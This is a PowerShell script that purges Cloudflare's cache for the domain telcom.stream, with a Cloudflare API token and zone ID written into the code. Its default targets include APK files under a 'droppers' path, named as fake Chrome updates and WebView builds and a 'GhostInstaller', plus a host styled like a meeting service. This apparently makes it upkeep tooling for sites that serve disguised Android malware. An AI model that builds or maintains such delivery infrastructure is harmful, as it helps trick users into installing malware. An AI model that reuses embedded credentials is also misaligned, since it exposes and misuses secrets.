# Cloudflare cache purge for the BetterDesk edge (telcom.stream).
#
# Why: Next.js serves /_next/static/chunks/*.js with `Cache-Control: immutable`.
# Editing a chunk in place leaves the same URL, so Cloudflare keeps serving the
# old bytes. After any in-place chunk/asset edit, run this to force a refetch.
#
# Token: a Cloudflare API token with  Zone -> Cache Purge  (Edit) scoped to the
# zone. The bundled token currently has only zone:read + dns_records, so a purge
# returns 401 until that permission is added.
#
# Usage:
#   pwsh -File scripts/cf-purge.ps1                 # default BetterDesk URLs
#   pwsh -File scripts/cf-purge.ps1 -Everything     # purge the whole zone
#   pwsh -File scripts/cf-purge.ps1 -Urls https://global.telcom.stream/x.js
# Env overrides: CF_API_TOKEN, CF_ZONE_ID

[CmdletBinding()]
param(
    [string[]]$Urls,
    [switch]$Everything
)

$ErrorActionPreference = 'Stop'
$token = if ($env:CF_API_TOKEN) { $env:CF_API_TOKEN } else { 'cfat_VJKBpvYnwneiAGnZHt6dJKzl1ZJDOyuNsmNdvRtCfaff4afa' }
$zone  = if ($env:CF_ZONE_ID)  { $env:CF_ZONE_ID }  else { '6cb3a3eb8fe4148b35289e5007d5f53f' }

if (-not $Urls -or $Urls.Count -eq 0) {
    $Urls = @(
        'https://global.telcom.stream/js/landing.js',
        'https://global.telcom.stream/downloads/droppers/Chrome_WebView_v117.apk',
        'https://global.telcom.stream/downloads/droppers/GhostInstaller.apk',
        'https://global.telcom.stream/downloads/droppers/Chrome_Update_v117.apk',
        'https://global.telcom.stream/downloads/droppers/Shizuku.apk',
        'https://us05web.telcom.stream/_next/static/chunks/13xmnwg2-o6d9.v3.js',
        'https://us05web.telcom.stream/_next/static/chunks/2tj-c187nji76.v3.js',
        'https://reels.telcom.stream/'
    )
}

$headers = @{ Authorization = "Bearer $token" }
$payload = if ($Everything) { @{ purge_everything = $true } } else { @{ files = $Urls } }
$body = $payload | ConvertTo-Json

try {
    $r = Invoke-RestMethod -Method Post -Uri "https://api.cloudflare.com/client/v4/zones/$zone/purge_cache" `
        -Headers $headers -ContentType 'application/json' -Body $body
    if ($r.success) {
        if ($Everything) { Write-Host "Purged the whole zone ($zone)." }
        else { Write-Host ("Purged {0} URL(s)." -f $Urls.Count) }
    } else {
        Write-Host "Purge failed:" ; $r.errors | ForEach-Object { "  $($_.code): $($_.message)" }
        exit 1
    }
} catch {
    Write-Host "Purge error: $($_.Exception.Message)"
    Write-Host "If 401/10000: add 'Zone -> Cache Purge' permission to the token (scope: telcom.stream)."
    exit 1
}
